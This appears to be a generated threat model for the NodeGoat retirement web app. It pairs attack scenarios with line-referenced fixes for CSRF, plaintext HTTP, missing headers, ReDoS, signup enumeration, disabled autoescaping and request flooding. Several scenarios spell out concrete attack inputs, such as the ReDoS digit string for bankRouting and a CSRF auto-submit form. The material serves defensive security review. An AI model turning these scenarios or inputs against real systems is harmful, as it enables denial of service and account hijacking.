threats.attackScenario: app/routes/memos.js:13 passes req.body.memo straight to memosDAO.insert with no length check and memosDAO.getAllMemos loads every memo for rendering through marked, so an authenticated attacker scripts repeated POST /memos calls with multi-megabyte Markdown bodies until /memos rendering ties up the single Node event loop and the page stops responding for all users.
assumptions: No request body size limit or per-user request rate limit is configured for POST /memos.
threats.impactReason: The retirement application becomes unavailable to all employees until memos are purged.
threats.likelihoodReason: Any self-registered user can drive the loop; only an account is required.

mitigation.summary: Bound memo size and the number of memos rendered.
steps: Configure a small limit on bodyParser.urlencoded/json in server.js:71-75.
Reject memo bodies longer than a fixed character count in app/routes/memos.js:11 before insert.
Paginate memosDAO.getAllMemos instead of rendering the whole collection.

threats.title: Cross-site request forgery overwrites a victim's profile SSN and bank account via POST /profile
threats.asset: personal profile data (SSN, bank account and routing number) stored for the victim's user record
threats.attackScenario: POST /profile at app/routes/index.js:48 authorises solely on the cookie-based session with no CSRF token (the csurf middleware is commented out in server.js:104-113), so an attacker hosts a page that auto-submits a hidden form with firstName, ssn, bankAcc and bankRouting=1234# to http://<app>/profile, and a logged-in victim who visits it has their bank account and routing number silently replaced with the attacker's.
assumptions: The session cookie is sent on cross-site form POSTs, i.e. no SameSite attribute restricts it.
threats.impactReason: An attacker can redirect a victim's retirement payouts by rewriting the stored bank account and routing number, and can corrupt SSN and DOB records.
threats.likelihoodReason: Only requires luring an authenticated user to any attacker-controlled page; no token or secret must be guessed.

mitigation.summary: Enable CSRF token validation on all state-changing routes, starting with POST /profile.
steps: Uncomment and enable the csurf middleware in server.js:104-113 (csurf is already a dependency in package.json).
Render `{{csrftoken}}` as a hidden input in the /profile form in app/views/profile.html:38.
Set `cookie: { sameSite: 'lax' }` on the express-session configuration in server.js:78 as defence in depth.

threats.title: POST /profile is submitted over plaintext HTTP, exposing SSN and bank details in transit
threats.asset: personal profile data (SSN, DOB, bank account and routing number) and the session cookie
threats.attackScenario: server.js:145 starts the application with http.createServer (the https variant is commented out at lines 149-155) and the session cookie is configured without `secure` (server.js:92-100), so an attacker on the same Wi-Fi or upstream network captures the POST /profile form body carrying ssn, dob, bankAcc and bankRouting together with the connect.sid cookie and replays the cookie to impersonate the victim.
assumptions: No TLS-terminating reverse proxy is placed in front of the Node process in the deployed environment.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: Full-identity data (SSN, DOB, bank account and routing number) plus a replayable session cookie are exposed for every profile save.
threats.likelihoodReason: Requires a network position (shared network, proxy, or ISP path), but no authentication or application flaw beyond the plaintext transport. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS only and mark the session cookie secure and httpOnly.
steps: Re-enable the https.createServer block in server.js (lines 149-155) or terminate TLS at a proxy and redirect all HTTP to HTTPS.
Set `cookie: { httpOnly: true, secure: true }` in the express-session options in server.js:78.
Add HSTS via the already-declared helmet dependency so browsers never resend the form over HTTP.

threats.title: Missing security response headers let a framed or injected page harvest profile form data
threats.asset: personal profile data (SSN, DOB, bank account and routing number) entered in the /profile form
threats.attackScenario: No helmet, CSP or frameguard middleware is applied to the Express app (helmet is imported only in commented code at server.js:10 and 38-65), so an attacker frames /profile on a lookalike site and overlays controls to clickjack the victim into submitting altered bank details, or exfiltrates the rendered ssn/bankAcc values to an external host because no content-security-policy restricts outbound script and form targets.
assumptions: No reverse proxy adds Content-Security-Policy, X-Frame-Options or similar headers in front of the Express app.
threats.impactReason: Framing or injected script on the profile page exposes the SSN, DOB and bank account fields rendered into app/views/profile.html.
threats.likelihoodReason: Requires luring an authenticated user to an attacker page, but the profile page is reachable by every logged-in user and nothing blocks framing.

mitigation.summary: Enable helmet so the profile responses carry CSP, frame-ancestors and nosniff headers.
steps: Uncomment and enable the helmet middleware block in server.js:38-65, using the helmet dependency already listed in package.json:16.
Configure helmet.contentSecurityPolicy with explicit script-src, form-action and frame-ancestors 'none' directives.
Call app.disable("x-powered-by") so the Express version is not advertised.

threats.title: Catastrophic ReDoS on the bankRouting field of POST /profile stalls the Node event loop
threats.asset: availability of the NodeGoat Express server for all users
threats.attackScenario: app/routes/profile.js:59 validates the bankRouting form field with /([0-9]+)+\#/, so an authenticated attacker posts bankRouting=99999999999999999999999999 (long digit run, no trailing '#') to POST /profile and the nested quantifier backtracks exponentially, pinning the single Node event loop and making every other request hang.
threats.impactReason: One request can consume 100% CPU on the single-threaded Node process and deny service to all users until the process is restarted.
threats.likelihoodReason: Any registered account can reach POST /profile and the payload is a trivial string typed into the Bank Routing # field.

mitigation.summary: Remove the nested quantifier from the bankRouting validation regex and bound the input length.
steps: Change the pattern at app/routes/profile.js:59 to `/^[0-9]+#$/` (the fix already noted at line 58) so no group is repeated.
Reject bankRouting values longer than a fixed maximum before running the regex.
Cap request body size in the body-parser configuration in server.js:71-75.

threats.title: No rate limiting on POST /signup allows mass automated account creation and username enumeration
threats.asset: the users collection and availability of the signup/login service
threats.attackScenario: POST /signup at app/routes/index.js:38 accepts unauthenticated registrations and its handler responds with "User name already in use" (app/routes/session.js:213), so a script posts thousands of userName values per minute to enumerate existing accounts and to flood the users collection with junk records, each of which also triggers an allocations write in prepareUserData.
assumptions: No rate limiting, CAPTCHA or bot control is applied in front of the signup route.
threats.impactReason: Unbounded registrations bloat the users and allocations collections and the distinct error message confirms which usernames exist for later credential attacks.
threats.likelihoodReason: The endpoint is reachable by any unauthenticated stranger and the request is a simple form POST.

mitigation.summary: Throttle and bot-check the signup endpoint and return a uniform response for taken usernames.
steps: Add a per-IP rate limiter in front of app.post("/signup") in app/routes/index.js:38.
Return a generic "registration could not be completed" message instead of "User name already in use" in app/routes/session.js:213.
Require an email verification step before the account becomes usable.

threats.title: POST /signup transmits new account passwords in cleartext over HTTP
threats.asset: user credentials (username and password) of newly registered accounts
threats.attackScenario: POST /signup at app/routes/index.js:38 carries userName, password and verify in a form body, and server.js:145 serves the app with http.createServer rather than the commented-out https server, so an attacker sniffing the shared network captures the registration credentials in cleartext and logs in as the new user.
assumptions: No TLS-terminating reverse proxy is deployed in front of the Node process.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: Captured credentials give full account takeover, and the stored password is reusable against the victim's other services.
threats.likelihoodReason: Needs a network vantage point, but no application-level obstacle exists once traffic is observable. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve /signup only over HTTPS.
steps: Re-enable the https.createServer block in server.js:149-155 or terminate TLS at a proxy and redirect HTTP to HTTPS.
Enable HSTS through the helmet dependency already declared in package.json:16.

threats.title: Tutorial pages and session cookies travel over plaintext HTTP, exposing the session cookie to network attackers
threats.asset: session cookie
threats.attackScenario: server.js:145 starts the application with http.createServer(app) and the HTTPS server plus the `secure`/`httpOnly` cookie options are commented out at server.js:92-100, so an attacker on the same Wi-Fi as a user browsing GET /tutorial/a1 reads the plaintext request, lifts the express-session cookie and replays it against /profile to read the victim's SSN and bank account number.
assumptions: TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
The application is reached directly over the HTTP listener rather than behind a TLS-terminating proxy that also sets secure cookie flags.
threats.impactReason: A stolen session cookie gives full access to the authenticated user's profile data including SSN, DOB and bank routing number.
threats.likelihoodReason: The tutorial pages are unauthenticated and widely browsed, and any shared-network or on-path position is enough to capture the cleartext traffic. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and mark the session cookie secure and httpOnly.
steps: Uncomment the https.createServer block at server.js:149-155 and remove the plaintext http.createServer listener at server.js:145, or terminate TLS at a proxy and redirect HTTP to HTTPS.
Uncomment the session cookie options at server.js:92-100 so `httpOnly: true` and `secure: true` are set on the express-session cookie.
Enable helmet.hsts() (already imported-but-commented at server.js:10 and :54) so browsers refuse plaintext requests.

threats.title: Tutorial pages are rendered by Swig with autoescape disabled and no CSP, so injected markup executes in the user's browser
threats.asset: session cookie
threats.attackScenario: GET /tutorial and /tutorial/:page at app/routes/tutorial.js:8 and :31 render templates with the `environmentalScripts` locals through Swig, which is configured with `autoescape: false` at server.js:135-142 while helmet.contentSecurityPolicy() and frameguard remain commented out at server.js:44-51, so an attacker who can influence any value rendered into these pages (or who frames /tutorial/a1 in a clickjacking overlay) executes script in the victim's origin and reads the non-httpOnly session cookie via document.cookie.
assumptions: At least one value rendered into the tutorial templates, such as environmentalScripts from config/config.js, is influenced by configuration or user-reachable input.
threats.impactReason: Script running on the tutorial origin can read the session cookie (httpOnly is commented out) and act as the victim against /profile.
threats.likelihoodReason: The tutorial routes are unauthenticated and reachable by anyone, and global autoescape is off for every template the app renders.

mitigation.summary: Re-enable Swig autoescaping and add a Content-Security-Policy and frame protections.
steps: Set `autoescape: true` in the swig.setDefaults call at server.js:135-142 and audit templates that rely on raw output.
Uncomment and configure helmet.contentSecurityPolicy() and helmet.frameguard() at server.js:44-51 using the helmet dependency already required at server.js:10.
Render `environmentalScripts` through an explicit allowlist in app/routes/tutorial.js rather than injecting raw script strings into the tutorial layout.

threats.title: Unauthenticated tutorial routes render Swig templates with no rate limiting, allowing cheap CPU exhaustion
threats.asset: availability of the RetireEasy application to logged-in users
threats.attackScenario: An attacker loops GET /tutorial/a1 … /tutorial/ssrf (app/routes/tutorial.js:31) from many connections; each request triggers a full Swig template render on the single Node process with no authentication and no request throttling in front of it, starving the event loop so that /login and /profile stop responding.
assumptions: No reverse proxy, CDN or rate-limiting middleware sits in front of the Express HTTP listener started at server.js:145.
Rendered tutorial pages are not cached between requests.
threats.impactReason: Loss of availability only; no data is disclosed or altered.
threats.likelihoodReason: The routes need no credentials and the flood requires only commodity bandwidth, though template rendering is relatively cheap per request.

mitigation.summary: Throttle and cache the unauthenticated tutorial routes.
steps: Add an express rate-limiting middleware in front of the tutorial router registration in app/routes/tutorial.js.
Render the static tutorial pages once at startup or serve them via express.static (already configured at server.js:121) instead of re-rendering per request.

questions.whyAsking: If traffic reaches the app over plain HTTP, login credentials and session cookies can be sniffed or intercepted by anyone on the network path between the browser and the server.
options: No, plain HTTP is used all the way to the app
Yes, a load balancer or proxy terminates TLS in front of it

questions.text: In production, does the MongoDB instance require authentication with a dedicated least-privilege application user, rather than the no-credential connection string shown in docker-compose.yml?

options: No, MongoDB accepts connections without credentials as configured
Yes, production MongoDB requires auth with a restricted-privilege user
Unsure what production database configuration looks like
questions.defaultAssumption: MongoDB has no authentication configured, matching the credential-less connection string in docker-compose.yml.

questions.text: Is encryption at rest enabled for the MongoDB deployment that stores SSNs, dates of birth, and bank account/routing numbers?
questions.whyAsking: With the ProfileDAO's field-level encryption disabled, if disk-level encryption at rest is also off, this sensitive PII sits fully readable in database files and backups to anyone who gains filesystem or backup access.
options: No, neither field-level nor storage-level encryption is enabled
Yes, the storage layer (disk/volume) encrypts data at rest
Unsure whether encryption at rest is configured
questions.defaultAssumption: Encryption at rest is not enabled, so sensitive fields are stored in plaintext given the ProfileDAO encryption code is commented out.
